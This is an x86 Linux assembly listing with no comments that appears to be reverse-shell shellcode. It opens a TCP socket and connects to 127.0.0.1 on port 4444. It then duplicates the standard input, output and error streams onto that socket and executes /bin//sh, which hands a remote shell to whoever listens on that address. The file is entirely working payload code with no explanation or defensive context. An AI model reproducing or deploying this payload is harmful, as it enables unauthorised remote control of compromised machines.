global _start

section .text

_start:

xor esi, esi

mov al, 0x66
inc esi
push esi
pop ebx

xor esi, esi
push esi
inc esi
push esi
inc esi
push esi

mov ecx, esp

xor esi, esi
push esi
pop edx

int 0x80

xchg edx, eax

mov al, 0x66

push 0x0100007f
push word 0x5c11
push word 0x2

mov ecx, esp


push 0x10
push ecx
push edx

mov ecx, esp

inc ebx
inc ebx

int 0x80

xchg edx, eax

push 0x2
pop ecx

jnp:

mov al, 0x3f
int 0x80
dec ecx
jns jnp


mov al, 0x0b
xor ecx, ecx

mov edx, ecx

push ecx
push 0x68732f2f
push 0x6e69622f

mov ebx, esp

int 0x80
